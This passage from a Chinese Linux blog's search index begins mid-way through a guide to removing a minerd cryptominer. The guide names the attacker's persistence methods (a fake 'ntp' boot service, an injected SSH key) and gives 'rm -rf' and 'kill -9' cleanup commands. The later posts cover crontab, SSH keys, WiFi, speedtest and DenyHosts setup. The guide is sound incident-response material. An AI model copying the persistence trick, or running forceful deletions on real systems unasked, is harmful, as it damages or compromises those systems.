.ssh/authorized_keys即可。修改完成后重启sshd服务，使配置生效即可。<br>4、删除黑客创建的伪装程序ntp<br>执行ls /etc/init.d/可以看到系统中是由对应的伪装程序的  </p><p><img src="https://yqfile.alicdn.com/72eede7da7d1bfb0c1c32f8c1e99993408a0cb70.png"></p><p>通过chkconfig –list ntp 可以看到此程序默认设置的是开机自动启动</p><p><img src="https://yqfile.alicdn.com/ade809df30ef7d688b551b2b0b559149a5800571.png"></p><p>如果此程序不进行清除，即使删除了minerd程序并且杀死了对应的进程，过一会系统还会重新创建minerd程序，并产生新的进程<br>查询一下当前系统中是否有ntp进程，可以看到ntp进程是通过/usr/sbin/ntp程序产生，因此需要把对应的执行程序也进行删除</p><p><img src="https://yqfile.alicdn.com/1199403d7e19bd225e5c65525a6ed8ce6bc1100f.png"></p><p>总结一下删除伪装程序的操作步骤  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kill -9 $PID 杀死查询到的ntp进程  </span><br><span class="line">rm -rf /etc/init.d/ntp  </span><br><span class="line">rm -rf /usr/sbin/ntp （此路径要根据具体的查询数据确定，实际情况可能会有所变化）  </span><br></pre></td></tr></table></figure><h3 id="·删除异常程序并关闭异常进程"><a href="#·删除异常程序并关闭异常进程" class="headerlink" title="·删除异常程序并关闭异常进程"></a>·删除异常程序并关闭异常进程</h3><p>根据之前的查询minerd程序所在路径为<code>/opt</code>，在执行的脚本中同时也在<code>/opt</code>目录下创建了一个<code>KHK75NEOiq33</code>的程序文件</p><p>因此要删除这两个文件，执行<code>rm -rf KHK75NEOiq33 minerd</code> 即可</p><p><img src="https://yqfile.alicdn.com/091056648e466a2f53301188b13de33b86039709.png"></p><p><code>kill -9 $PID</code> 杀死对应的进程ID </p><p>通过ps命令查询一下minerd对应的进程详细情况<br>​    ps -aux|grep minerd<br><img src="https://yqfile.alicdn.com/c92e1ee20ba41c253bb6c3786919e5439e469edc.png"></p><h3 id="·修改SSH端口以及采用（字母-符号-数字-密码）的方式登录"><a href="#·修改SSH端口以及采用（字母-符号-数字-密码）的方式登录" class="headerlink" title="·修改SSH端口以及采用（字母+符号+数字=密码）的方式登录"></a>·修改SSH端口以及采用（字母+符号+数字=密码）的方式登录</h3><h3 id="·适当时可以考虑一下网上的防爆破SSH脚本或程序"><a href="#·适当时可以考虑一下网上的防爆破SSH脚本或程序" class="headerlink" title="·适当时可以考虑一下网上的防爆破SSH脚本或程序"></a>·适当时可以考虑一下网上的防爆破SSH脚本或程序</h3>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>自家Linux</title>
      <link href="/posts/57501.html"/>
      <url>/posts/57501.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://ws1.sinaimg.cn/large/e3bf8736gy1fyqgf924gsj21z81bhx6u.jpg"></p><span id="more"></span><h3 id="centos7配置第一篇"><a href="#centos7配置第一篇" class="headerlink" title="#centos7配置第一篇"></a>#centos7配置第一篇</h3><p>##GUI界面锁屏解除</p><pre><code>#设置-&gt;隐私-&gt;锁屏和通知  都关闭</code></pre><p>##CLI界面合盖休眠解除</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/systemd/logind.conf</span><br></pre></td></tr></table></figure><p>#HandlePowerKey       //按下电源键后的行为，默认 <code>=poweroff</code></p><p>#HandleSuspendKey     //按下挂起键后的行为，默认 <code>=suspend</code></p><p>#HandleHibernateKey   //按下休眠键的行为，默认 <code>=hibernate</code></p><p>#HandleLidSwitch      //合上笔记本盖后的行为，默认 <code>=suspend</code>，应该改为 <code>=lock</code>，并且在文件中去除前面的<code>#</code></p><p>运行配置文件使其生效 ###</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart systemd-logind</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux Crontab 安装使用详细说明</title>
      <link href="/posts/56521.html"/>
      <url>/posts/56521.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.com/large/e3bf8736ly1fypzllrsn1j21250pfhdt.jpg"></p><span id="more"></span><blockquote><p>&emsp;&emsp;crontab命令常见于Unix和Linux的操作系统之中，用于设置周期性被执行的指令。该命令从标准输入设备读取指令，并将其存放于“crontab”文件中，以供之后读取和执行。通常，crontab储存的指令被守护进程激活。crond 常常在后台运行，每一分钟检查是否有预定的作业需要执行。这类作业一般称为cron jobs。</p></blockquote><br><h3 id="一、安装"><a href="#一、安装" class="headerlink" title="一、安装"></a>一、安装</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum -y install vixie-cron</span><br><span class="line">yum -y install crontabs</span><br></pre></td></tr></table></figure><h4 id="说明："><a href="#说明：" class="headerlink" title="说明："></a>说明：<br></h4><p>vixie-cron 软件包是 cron 的主程序；<br>crontabs 软件包是用来安装、卸装、或列举用来驱动 cron 守护进程的表格的程序。</p><h3 id="二、配置"><a href="#二、配置" class="headerlink" title="二、配置"></a>二、配置</h3><p>cron 是 linux 的内置服务，但它不自动起来，可以用以下的方法启动、关闭这个服务： </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">service crond start     //启动服务</span><br><span class="line">service crond stop      //关闭服务</span><br><span class="line">service crond restart   //重启服务</span><br><span class="line">service crond reload    //重新载入配置</span><br><span class="line">service crond status    //查看crontab服务状态</span><br></pre></td></tr></table></figure><p> 在CentOS系统中加入开机自动启动:  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chkconfig --level 345 crond on</span><br></pre></td></tr></table></figure><h4 id="列子："><a href="#列子：" class="headerlink" title="列子："></a>列子：</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">01 * * * * root run-parts /etc/cron.hourly</span><br><span class="line">02 4 * * * root run-parts /etc/cron.daily</span><br><span class="line">22 4 * * 0 root run-parts /etc/cron.weekly</span><br><span class="line">42 4 1 * * root run-parts /etc/cron.monthly</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CentOS 7安装SSH</title>
      <link href="/posts/43991.html"/>
      <url>/posts/43991.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://ws1.sinaimg.cn/large/e3bf8736ly1fypzqdtamej21l8123qv7.jpg"></p><span id="more"></span><h3 id="VPS上可能没有安装桌面，但一般来说都会安装ssh，并且防火墙默认开放22端口。"><a href="#VPS上可能没有安装桌面，但一般来说都会安装ssh，并且防火墙默认开放22端口。" class="headerlink" title="VPS上可能没有安装桌面，但一般来说都会安装ssh，并且防火墙默认开放22端口。"></a>VPS上可能没有安装桌面，但一般来说都会安装ssh，并且防火墙默认开放22端口。</h3><p>那就从ssh开始。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装ssh，默认已安装好</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">yum install ssh</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动ssh服务器端</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">service sshd start</span></span><br></pre></td></tr></table></figure><h3 id="ssh登陆"><a href="#ssh登陆" class="headerlink" title="ssh登陆"></a>ssh登陆</h3><p>如果本地端是Linux</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ssh root@192.168.1.1</span></span><br></pre></td></tr></table></figure><p>其中root表示的是登录用户名，192.168.1.1为主机的IP地址，当然也可以使用主机名、域名来指代IP地址。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ssh 192.168.1.1</span></span><br></pre></td></tr></table></figure><p>则会以当前客户端的用户名进行登录。</p><h3 id="ssh无密码登录"><a href="#ssh无密码登录" class="headerlink" title="ssh无密码登录"></a>ssh无密码登录</h3><p>但是每次输入密码登录十分麻烦，有没有一种方式可以让服务器能够确定我的身份，无需输入密码可以直接通过认证？</p><p>ssh除了使用密码验证外，还提供了一种公私密钥的验证方式。客户端生成一个私钥，并生成一个与之对应的公钥，然后将公钥上传到服务器上。下面是Linux示例。</p><h4 id="在客户端生成私钥、公钥（注意，在客户端完成）："><a href="#在客户端生成私钥、公钥（注意，在客户端完成）：" class="headerlink" title="在客户端生成私钥、公钥（注意，在客户端完成）："></a>在客户端生成私钥、公钥（注意，在客户端完成）：</h4><pre><code># ssh-keygen -t rsa</code></pre><p><code>-t</code> 指定要创建的密钥类型，默认就是rsa了，所以只执行ssh-keygen是一样的。</p><p>期间会提示你输入你私钥的加密密码。如果需要完全脱离密码，此处可留空，直接回车，否则以后每次连接需要本地解锁。</p><p>完成后，会当前用户的主目录下的<code>~/.ssh/</code>路径下生成两个文件<code>id_rsa</code>与<code>id_rsa.pub</code>分别是私钥与公钥。</p><p>接下来，要把生成的公钥上传到服务器上，同样还是在客户端执行以下的代码。</p><pre><code># ssh-copy-id -i ~/.ssh/id_rsa.pub root@192.168.1.1</code></pre><p>其中root可以修改为你想要自动登录的服务器端用户名，192.168.1.1修改为你的VPS主机名或IP地址。</p><h3 id="最后，ssh登录远程服务器。"><a href="#最后，ssh登录远程服务器。" class="headerlink" title="最后，ssh登录远程服务器。"></a>最后，ssh登录远程服务器。</h3><pre><code># ssh root@192.168.1.1</code></pre><p>此时就不需要密码就可以登录了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux在CLI下连接WiFi</title>
      <link href="/posts/58864.html"/>
      <url>/posts/58864.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://ws1.sinaimg.cn/large/e3bf8736gy1fyqcfaxx0dj22801hcb2e.jpg"></p><span id="more"></span><p>系统安装好后，有线与线连接都可以使用， 切换联网方式执行要使用“<code>ifdown 对应的网卡名称</code>”或者“<code>ifup 对应的网卡名称</code>”这两条命令即可。</p><p>使用 nmcli命令，查看各网卡的状态。得知无线网卡已经被驱动起来，并且已经纳入NetworkManager的管理。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# nmcli dev status</span><br><span class="line">DEVICE      TYPE      STATE   CONNECTION   </span><br><span class="line">wlp3s0b1    wifi      连接的  Daoji_Studio </span><br><span class="line">virbr0      bridge    连接的  virbr0       </span><br><span class="line">enp2s0      ethernet  不可用  --           </span><br><span class="line">lo          loopback  未托管  --           </span><br><span class="line">virbr0-nic  tun       未托管  --           </span><br></pre></td></tr></table></figure><p>这是我的WiFi连接情况 </p><p>如果无线网卡没有被纳入NetworkManager的管理，则可以安装”NetworkManager-wifi” ，命令如下。 </p><p>1.设置NetworkManager自动启动 </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chkconfig NetworkManager on</span><br></pre></td></tr></table></figure><p>2.安装NetworkManager-wifi </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y install NetworkManager-wifi</span><br></pre></td></tr></table></figure><p>运行这条命令后重启centos。进入系统后，打开NetworkManager，设置好WiFi后，就可以连接到WiFi了。<br>上述步骤进行完以后，若WIFI仍然没开启，或者启动后无法自动连接WiFi，可以这样开启WIFI: </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmcli r wifi on // 开启WIFI</span><br><span class="line">nmcli dev wifi //扫描可用WIFI</span><br><span class="line">nmcli dev wifi connect password // 连接WIFI</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用Speedtest进行带宽测速</title>
      <link href="/posts/18198.html"/>
      <url>/posts/18198.html</url>
      
        <content type="html"><![CDATA[<h1 id="使用Speedtest进行带宽测速"><a href="#使用Speedtest进行带宽测速" class="headerlink" title="使用Speedtest进行带宽测速"></a>使用Speedtest进行带宽测速</h1><hr><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget -O speedtest-cli https://raw.github.com/sivel/speedtest-cli/master/speedtest.py</span><br><span class="line">chmod +x speedtest-cli</span><br></pre></td></tr></table></figure><hr><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/sivel/speedtest-cli/master/speedtest.py</span><br><span class="line"></span><br><span class="line">chmod a+rx speedtest.py</span><br><span class="line">mv speedtest.py /usr/local/bin/speedtest-cli</span><br><span class="line">chown root:root /usr/local/bin/speedtest-cli</span><br><span class="line"></span><br><span class="line">speedtest-cli</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DenyHosts安装及配置</title>
      <link href="/posts/7680.html"/>
      <url>/posts/7680.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://ws1.sinaimg.cn/large/e3bf8736ly1fypzd8dhstj20zk0npe81.jpg"></p><span id="more"></span><blockquote><p>DenyHosts（项目主页：<a href="http://denyhosts.sourceforge.net/%EF%BC%89%E6%98%AF%E8%BF%90%E8%A1%8C%E4%BA%8ELinux%E4%B8%8A%E7%9A%84%E4%B8%80%E6%AC%BE%E9%A2%84%E9%98%B2SSH%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E7%9A%84%E8%BD%AF%E4%BB%B6%EF%BC%8C%E5%8F%AF%E4%BB%A5%E4%BB%8Ehttp://sourceforge.net/projects/denyhosts/files/%E8%BF%9B%E8%A1%8C%E4%B8%8B%E8%BD%BD%EF%BC%8C%E7%84%B6%E5%90%8E%E5%B0%86%E4%B8%8B%E8%BD%BD%E5%9B%9E%E6%9D%A5%E7%9A%84DenyHosts-2.6.tar.gz%E6%BA%90%E7%A0%81%E5%8C%85%E4%B8%8A%E4%BC%A0%E5%88%B0Linux%E7%B3%BB%E7%BB%9F%E4%B8%AD%E3%80%82">http://denyhosts.sourceforge.net/）是运行于Linux上的一款预防SSH暴力破解的软件，可以从http://sourceforge.net/projects/denyhosts/files/进行下载，然后将下载回来的DenyHosts-2.6.tar.gz源码包上传到Linux系统中。</a></p></blockquote><h3 id="下面是安装过程"><a href="#下面是安装过程" class="headerlink" title="下面是安装过程"></a>下面是安装过程</h3><hr><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">wget https://www.cubecloud.net/DenyHosts-2.6.tar.gz           #下载安装包</span><br><span class="line">tar zxvf DenyHosts-2.6.tar.gz      #解压源码包</span><br><span class="line">cd DenyHosts-2.6 #进入安装解压目录</span><br><span class="line">python setup.py install #安装DenyHosts</span><br><span class="line">cd /usr/share/denyhosts/ #默认安装路径</span><br><span class="line">cp denyhosts.cfg-dist denyhosts.cfg      #denyhosts.cfg为配置文件</span><br><span class="line">cp daemon-control-dist daemon-control    #daemon-control为启动程序</span><br><span class="line">chown root daemon-control   #添加root权限</span><br><span class="line">chmod 700 daemon-control #修改为可执行文件</span><br><span class="line">ln -s /usr/share/denyhosts/daemon-control /etc/init.d          #对daemon-control进行软连接，方便管理</span><br></pre></td></tr></table></figure><p>安装到这一步就完成了。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/daemon-control start    #启动denyhosts</span><br><span class="line">chkconfig daemon-control on #将denghosts设成开机启动</span><br></pre></td></tr></table></figure><hr><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vi /usr/share/denyhosts/denyhosts.cfg       #编辑配置文件，另外关于配置文件一些参数，通过grep -v &quot;^#&quot; denyhosts.cfg查看</span><br><span class="line">SECURE_LOG = /var/log/secure                  #ssh 日志文件，redhat系列根据/var/log/secure文件来判断；Mandrake、FreeBSD根据 /var/log/auth.log来判断</span><br><span class="line">                                                              #SUSE则是用/var/log/messages来判断，这些在配置文件里面都有很详细的解释。</span><br></pre></td></tr></table></figure><hr><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">HOSTS_DENY = /etc/hosts.deny                 #控制用户登陆的文件</span><br><span class="line">PURGE_DENY = 30m                                  #过多久后清除已经禁止的，设置为30分钟；</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">‘m’ = minutes</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">‘h’ = hours</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">‘d’ = days</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">‘w’ = weeks</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">‘y’ = years</span></span><br><span class="line">BLOCK_SERVICE = sshd                           #禁止的服务名，当然DenyHost不仅仅用于SSH服务</span><br><span class="line">DENY_THRESHOLD_INVALID = 1             #允许无效用户失败的次数</span><br><span class="line">DENY_THRESHOLD_VALID = 3                 #允许普通用户登陆失败的次数</span><br><span class="line">DENY_THRESHOLD_ROOT = 3                 #允许root登陆失败的次数</span><br><span class="line">DAEMON_LOG = /var/log/denyhosts      #DenyHosts日志文件存放的路径，默认</span><br></pre></td></tr></table></figure><p>更改DenyHosts的默认配置之后，重启DenyHosts服务即可生效: </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/daemon-control restart #重启denyhosts</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
